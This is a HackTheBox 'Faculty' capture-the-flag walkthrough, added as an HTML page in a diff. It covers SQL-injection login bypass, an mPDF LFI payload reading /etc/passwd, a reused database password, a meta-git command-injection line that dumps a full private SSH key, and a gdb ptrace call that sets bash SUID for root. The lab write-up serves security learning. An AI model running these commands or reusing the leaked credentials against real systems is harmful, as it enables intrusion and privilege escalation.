@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<title>Faculty HTB Writeup | 0xv01d</title>
+<meta property="og:locale" content="en_US">
+<script type="application/ld+json">
+</script>
+
+    <link rel="stylesheet" href="/Styles/style.css?v=">
+	<link rel="stylesheet" href="/Styles/highlight_monokai.css">
+<!-- Setup Google Analytics -->
+
+	<link rel="shortcut icon" type="image/x-icon" href="/images/HTB/faculty/favicon.ico">
+
+<!--Information Sidebar-->
+
+  </head>
+  <body>
+      <header class="app-header">
+        <a href="https:0xv01d.github.io">
+          <img class="avatar" src="/images/index/avatar.png">
+		</a><p></p>
+		<h1><strong>0xv01d Stuff</strong></h1>
+		<nav class="app-header-menu">
+			<a class="app-header-menu-item" href="/">Home</a>
+             - 
+			<a class="app-header-menu-item" href="/tags/">Tags</a>
+             - 
+			<a class="app-header-menu-item" href="/about/">About</a>
+		</nav>
+		<p>Just another computer adict.</p>
+		<div text-align:="" center;="" width:="" 100%;="" class="app-header-media">
+			<a class="fab fa-github-square" href="https://github.com/0xv01d" rel="noreferrer noopener" target="_blank"><img src="/images/index/github.png"></a>
+			<a class="fab fa-envelope-square" href="mailto:im_0xv01d@outlook.com" rel="noreferrer noopener" target="_blank"><img src="/images/index/email.png"></img></a>
+			<a href="https://discord.com/users/504974900239400961" class="fab fa-discord" rel="noreferrer noopener" target="_blank"></a>
+			<a class="fab fa-twitter-square" href="https://twitter.com/0xEr3bus" rel="noreferrer noopener" target="_blank"></a>
+		</div>
+        <a href="https://www.hackthebox.com/profile/1120840" rel="noreferrer noopener" target="_blank">
+			<img src="http://www.hackthebox.eu/badge/image/1120840" alt="Hack The Box">
+        </a>
+
+      </header>
+
+      <main class="app-container">
+		
+		<article class="post">		
+			<header class="post-header">
+
+	
+<!--Machine Title-->
+			<div class="title">Faculty Walkthrough</div>			
+<!--Skill Tags-->								
+			<div class="tag-skills">
+				<svg class="icon icon-tag svg-tag" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+					<title>tag</title>
+					<path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" x2="7.01" y1="7" y2="7"></line>
+				</svg>
+				<a class="tag" href="#">SQL-Injection</a>
+				<a class="tag" href="#">PDF-Exploitation</a>
+				<a class="tag" href="#">HTML-Injection</a>
+				<a class="tag" href="#">LFI</a>
+				<a class="tag" href="#">Information-Leakage</a>
+				<a class="tag" href="#">RCE</a>
+				<a class="tag" href="#">Capability-Abusing</a>
+			</div>
+
+			</header>
+
+<!--Machine Card-->			
+			<div><img class="machine-card" src="/images/HTB/faculty/faculty_card.png"></img></div>
+			
+<!--Machine Overview-->
+			<div class="subtitle">Faculty Overview</div>
+			<p class="paragraph"><a href="https://app.hackthebox.com/machines/Faculty" rel="noreferrer noopener" target="_blank">Faculty</a> machine on HackTheBox, submitted by 
+			<a href="https://app.hackthebox.com/users/36994" rel="noreferrer noopener" target="_blank">jbyolo</a>. The machine start from a web server running nginx,
+			eventually leading to a login panel that can be bypassed with <a href="https://portswigger.net/web-security/sql-injection" rel="noreferrer noopener" target="_blank">SQL injection</a>, then we find a PDF generator that we can <a href="https://mpdf.github.io/reference/html-control-tags/annotation.html" rel="noreferrer noopener" target="_blank">inject html</a> into. 
+			Wich lead us to LFI, where we can find ssh credentials, after that we can do user pivoting by abusing <a href="https://hackerone.com/reports/728040" rel="noreferrer noopener" target="_blank">meta-git</a> 
+			to read another user's ssh directory, and finally abuse<a href="https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc?gi=a7e86ad0b7b" rel="noreferrer noopener" target="_blank"> cap_sys_ptrace</a> to spawn a suid shell.</p>
+
+<!--Machine Resolution-->
+			<h1 id="header-1">Recon</h1>
+
+			<p>Let's start with a basic port scan</p>
+
+			<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+# Nmap 7.92 scan initiated Mon Sep 19 14:06:49 2022 as: nmap -p22,80 -sCV -vvv -n -Pn -oN targeted 10.10.11.169
+<span class="kt">Nmap scan </span><span class="ld">report </span><span class="gd">for </span><span class="s">10.10.11.169</span>
+<span class="kt">Host </span><span class="ld">is up, received user-set (0.25s latency).</span>
+<span class="kt">Scanned </span><span class="ld">at</span><span class="s"> 2022-10-25 14:06:50</span><span class="ld"> EDT for 26s</span>
+
+<span class="kt">PORT   STATE SERVICE REASON         VERSION</span>
+<span class="s">22/tcp </span><span class="kt">open</span><span class="ld">  ssh     syn-ack ttl 63 </span><span class="kt">OpenSSH</span><span class="ld"> 8.2p1 </span><span class="kt">Ubuntu</span><span class="ld"> 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span>
+<span class="gd">|</span><span class="k"> ssh-hostkey: </span>
+<span class="gd">|</span></span><span class="s">   3072 e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 </span><span class="kt">(RSA)</span>
+<span class="gd">|</span><span class="ld"> ssh-rsa </span><span class="kt">AAAAB3NzaC1yc2EAAAADAQABAAABgQCzpbkoBfa0UKxT+Giw4wE1jz82gGRpuANEdRt</span>+<span class="ld">D6gp6hDmrcaODUiU/N+4nX08jcFBk103cLwU8VisxyRu3wHMTHXaYx2WMZXPtb8clv3Hrt+q2m4eL+DBJMkHO10qCx1IwfYcNyJA3CNCj88X8RgWIREalYWyNHeQFzAHZx4SSrCP9aW5QKqAYVAAS4Za0pts4HVYlfuOrxFgO/Z3FL3xynYeyLrFM+iEx0cMl9rIYWG8NzqVnBe180u+7d/y/kcsZU6MkBMmqWQlGA6o4srVx73AqbUDChkv8glvq0ZbD1JYmACuMCdn/GFI8lRlKaw1BaYeuP0l6qgbb65ghdECYEXC3iycPkR77D6gMbIbg4F9wvzD9AF//aCR+6t8F29DyP/mh1J8a+yiUHY2HJJaDvB5vQLg5Y++9yNEDmxlGFQTdJm/n7YhP2Qj+lkfgsERAO9pfIWGCCWaXl6fddUG4gp1bHLZkek+exgsimU7hApGFrJCtYPkf78xC3pvxx0=</span>
+<span class="gd">|</span><span class="ld">   256 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d </span><span class="kt">(ECDSA)</span>
+<span class="gd">|</span><span class="ld"> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDH8WAd+YlbEo4Fpz3+UaOYyCJGFa/E29JORgMAIOXVlGUpvMgQqiaqDMXtbt/G03rGEI9h8dpFAmswN1LJ8uig=</span>
+<span class="gd">|</span><span class="ld">   256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 </span><span class="kt">(ED25519)</span>
+<span class="gd">|</span><span class="ld">_ssh-ed25519 </span><span class="kt">AAAAC3NzaC1lZDI1NTE5AAAAINSCwKublVScg9d/3Tc/NAh0n9XH5lE9SBfl2dl+v6F+</span>
+<span class="s">80/tcp</span><span class="ld"> open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)</span>
+<span class="gd">|</span>_<span class="k">http-title: </span><span class="ld">Did not follow redirect to http://faculty.htb</span>
+<span class="gd">|</span><span class="k"> http-methods: </span>
+<span class="gd">|</span>_  <span class="kt">Supported</span><span class="k"> Methods: </span><span class="kt">GET HEAD POST OPTIONS</span>
+<span class="gd">|</span><span class="k">_http-server-header: </span><span class="ld">nginx/1.18.0 </span><span class="kt">(Ubuntu)</span>
+<span class="kt">Service</span><span class="ld"> Info: OS: </span><span class="kt">Linux</span><span class="ld">; CPE: cpe:/o:linux:linux_kernel</span>
+
+<span class="kt">Read</span><span class="ld"> data files </span><span class="k">from: </span><span class="ld">/usr/bin/../share/nmap</span>
+<span class="kt">Service</span><span class="ld"> detection performed. Please report any incorrect results at </span><span class="k">https://nmap.org/submit/ .</span>
+# Nmap done at Mon Sep 19 14:07:16 2022 -- 1 IP address (1 host up) scanned in 26.58 seconds
+
+			</code></pre></div></div>
+
+			<p class="head-img">After doing some enumeration with whatweb, we can see a redirect, let's take a look at the login</p>
+			
+
+		<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯</span><span class="ld"><span class="kt"> whatweb </span>http://faculty.htb
+http://faculty.htb [302 Found] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.169], JQuery, RedirectLocation[login.php], Script[text/javascript], Title[School Faculty Scheduling System], nginx[1.18.0]
+http://faculty.htb/login.php [200 OK] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.169], JQuery, Script[text/javascript], Title[School Faculty Scheduling System], nginx[1.18.0]
+</span>	</code></pre></div></div>
+
+			<p class="head-img">After taking a look at the source, we can't find anything, we'll enumerate some directories and then play around with the login and see if it's vulnerable to sql injection</p>
+			<img class="img-post" style="max-width: 408px;" src="/images/HTB/faculty/login_php.png"></img>
+
+			<p class="head-img">And we got an admin directory, we can see what's in there but first let's get in</p>
+	
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                                  
+<span class="na">❯</span><span class="ld"><span class="kt"> gobuster </span>dir -u faculty.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://faculty.htb
+[+] Method:                  GET
+[+] Threads:                 200
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/10/25 15:03:00 Starting gobuster in directory enumeration mode
+===============================================================
+/admin                (Status: 301) [Size: 178] [--> http://faculty.htb/admin/]
+                                                                               
+===============================================================
+2022/10/25 15:07:23 Finished
+===============================================================
+
+</span> </code></pre></div></div>
+			
+			<p class="head-img">Apparently it's vulnerable to sqli, and also exfiltrates the path from admin_class.php, let's keep it and try to bypass it</p>
+			<img class="img-post" style="max-width: 407px;" src="/images/HTB/faculty/login_exfiltrated_data.png"></img>
+
+			<p class="head-img">With a basic injection we are in, now let's go to the admin directory</p>
+			<img class="img-post" style="max-width: 415px;" src="/images/HTB/faculty/login_bypass.png"></img>
+
+			<p class="head-img">It's the scheduling system, it has some sections, and each one has a table, apparently the data it's brought from the database, but also we can see a pdf generator that looks juicy we can play with it and then enumerate the db</p>
+            <img class="img-post" style="max-width: 480px;" src="/images/HTB/faculty/scheduling_system_admin.png"></img>
+
+            <p class="head-img">Once we click on it, it generates a pdf with the tables content, we can also see in the url that it uses mpdf to render it, let's pass it through burp to see how it's parsed</p>
+            <img class="img-post" style="max-width: 511px;" src="/images/HTB/faculty/pdf_generator.png"></img>
+
+            <p class="head-img">Once we intercept the request we see the data, but it's encoded</p>
+            <img class="img-post" style="max-width: 541px;" src="/images/HTB/faculty/pdf_request.png"></img>
+
+            <p class="head-img">We can decode the data from base64, and URL decode it twice. Once decoded, we can see they are html control tags for mpdf</p>
+            <img class="img-post" style="max-width: 553px;" src="/images/HTB/faculty/pdf_request_decoded.png"></img>
+
+            <p class="head-img">Searching for some mpdf vuln, we found a Local File Inclusion, by taking a look at the exploit or just the mpdf <a href="https://mpdf.github.io/reference/html-control-tags/annotation.html">docs</a>, we can create our <a href="https://gchq.github.io/CyberChef/#recipe=URL_Encode(false)URL_Encode(false)To_Base64('A-Za-z0-9%2B/%3D')&input=PGFubm90YXRpb24gZmlsZT0iL2V0Yy9wYXNzd2QiIGNvbnRlbnQ9Ii9ldGMvcGFzc3dkIi8%2B">payload</a> and encode it in the right format to list the /etc/passwd</p>
+
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯</span><span class="ld"><span class="kt"> searchsploit </span>mpdf
+----------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                   |  Path
+----------------------------------------------------------------------------------------------------------------- ---------------------------------
+dompdf 0.6.0 - 'dompdf.php?read' Arbitrary File Read                                                             | php/webapps/33004.txt
+dompdf 0.6.0 beta1 - Remote File Inclusion                                                                       | php/webapps/14851.txt
+mPDF 5.3 - File Disclosure                                                                                       | php/webapps/18248.pl
+<span class="gd">mPDF 7.0 - Local File Inclusion                                                                                  | php/webapps/50995.py</span>
+SlimPDF Reader - Denial of Service (PoC)                                                                         | windows/dos/17274.txt
+Slimpdf Reader 1.0 - Memory Corruption                                                                           | windows/dos/19391.py
+TYPO3 Extension ke DomPDF - Remote Code Execution                                                                | php/webapps/35443.txt
+----------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+</span> </code></pre></div></div>
+
+            <p class="head-img">So, we gonna generate a pdf and intercept the request, so we can place our payload</p>
+            <img class="img-post" style="max-width: 473px;" src="/images/HTB/faculty/sending_payload.png"></img>
+
+            <p class="head-img">And we got it, let's download the attcahed file</p>
+            <img class="img-post" style="max-width: 276px;" src="/images/HTB/faculty/attached_file.png"></img>
+
+			<p class="head-img">We got three users, let's try the same with the admin_class.php leaked before</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯</span><span class="ld"><span class="kt"> cat </span>passwd | <span class="kt">grep</span> sh$
+root:x:0:0:root:/root:/bin/bash
+gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
+developer:x:1001:1002:,,,:/home/developer:/bin/bash
+</span> </code></pre></div></div>
+
+	<p class="head-img">Once we download the file, we can see how the data is managed on the web, additionally we see another file, we have to repeat the process with this new file</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯</span><span class="ld"><span class="kt"> cat </span>admin_class.php | <span class="kt">head</span> -n10
+<span class="s"><<span class="s">?php</span></span>
+<span class="kt">session_start</span>();
+<span class="kt">ini_set</span>(<span class="k">'display_errors'</span>, <span class="s">1</span>);
+<span class="na">Class</span> <span class="kt">Action</span> {
+	<span class="r">private</span> $db;
+
+	<span class="r">public</span> function __construct() {
+		ob_start();
+   	<span class="r">include</span> <span class="k">'db_connect.php'</span>;
+</span> </code></pre></div></div>
+
+            <p class="head-img">And we found something that looks like a cred, let's test it via SSH with the users we found earlier.</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯</span><span class="ld"><span class="kt"> cat </span>db_connect.php
+<span class="s"><</span><span class="s">?php 
+
+$conn</span><span class="r">= </span>new <span class="na">mysqli</span><span class="r">(</span><span class="k">'localhost','sched','Co.met06aci.dly53ro.per','scheduling_db'</span><span class="r">)</span>or die<span class="r">(</span><span class="k">"Could not connect to mysql"</span><span class="r">.<span class="kt">mysqli_error</span><span class="s">($con)</span>);</span>
+</span> </code></pre></div></div>
+
+            <p class="head-img">It works with gbyolo, we're in, but there's no flag, we should probably get access to the developer account</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯</span><span class="ld"><span class="kt"> ssh </span>gbyolo@faculty.htb
+gbyolo@faculty.htb's password: <span class="gi">Co.met06aci.dly53ro.per</span>
+You have mail.
+<span class="k">gbyolo@faculty:~$</span>
+</span> </code></pre></div></div>
+
+            <p class="head-img">After playing around for a while, we discovered that we can run meta-git with sudoers privileges. Looking for something interesting to play with, we found <a href="https://hackerone.com/reports/728040" rel="noreferrer noopener" target="_blank">RCE</a>.
+We could try to get a rev shell, but we'll just try to read the developer's .ssh and get some persistence</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="k">gbyolo@faculty:~$<span class="ld"><span class="kt"> sudo </span>-l
+[sudo] password for gbyolo: <span class="gi">Co.met06aci.dly53ro.per</span>
+Matching Defaults entries for gbyolo on faculty:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User gbyolo may run the following commands on faculty:
+    (developer) /usr/local/bin/meta-git
+<span class="k">gbyolo@faculty:~$</span>
+</span> </code></pre></div></div>
+
+            <p class="head-img">It worked, now let's log in as developer</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="k">gbyolo@faculty:~$</span> cd /tmp
+<span class="k">gbyolo@faculty:/tmp$</span> sudo -u developer meta-git clone 'RCE | cat ~/.ssh/id_rsa'
+meta git cloning into 'RCE | cat ~/.ssh/id_rsa' at id_rsa
+
+id_rsa:
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+</span> </code></pre></div></div>
+
+            <p class="head-img">We get the first flag now let's find a way to escalate privileges, after some digging with linpeas we find a <a href="https://github.com/Markakd/CVE-2022-2588" rel="noreferrer noopener" target="_blank">CVE-2022-2588</a> it will create a new user with root privileges but i won't take that path, also linpeas found out that gdb has cap_sys_ptrace which will allow us to attach some process and trace its system calls, so we can easily inject code to get a suid shell, let's try it</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="na">❯</span><span class="ld"><span class="kt"> ssh </span>-i id_rsa developer@faculty.htb
+<span class="k">developer@faculty:~$</span> cat user.txt 
+8fe3a0f93eae871028137d36bdf55b29
+<span class="k">developer@faculty:~$</span>
+</span> </code></pre></div></div>
+
+            <p class="head-img">We take a process running as root, and attach it to gdb, and now we should have a privileged shell, we just have to call it</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="k">developer@faculty:~$</span><span class="ld"> gdb -p 699
+Attaching to process 699
+(gdb) 
+(gdb) call (void)system("chmod u+s /bin/bash")
+[Detaching after vfork from child process 18818]
+(gdb) quit
+A debugging session is active.
+
+<span class="na">	Inferior 1 [process 699] will be detached.</span>
+
+Quit anyway? (y or n) y
+Detaching from program: /usr/bin/python3.8, process 699
+<span class="na">[Inferior 1 (process 699) detached]</span>
+</span> </code></pre></div></div>
+
+
+            <p class="head-img">That's it, we own it.</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="ld"><span class="k">developer@faculty:~$</span> bash -p
+bash-5.0# id
+uid=1001(developer) gid=1002(developer) euid=0(root) groups=1002(developer),1001(debug),1003(faculty)
+bash-5.0# cat /root/root.txt
+0964bbb20377b4e3b6f1b320e181f3be
+bash-5.0# exit
+exit
+<span class="k">developer@faculty:~$</span> exit
+logout
+<span class="r">Connection to faculty.htb closed.</span>
+
+</span> </code></pre></div></div>
+<a href="#">Go back</a>
+		</article>
+      </main>
+  </body>
+</html>
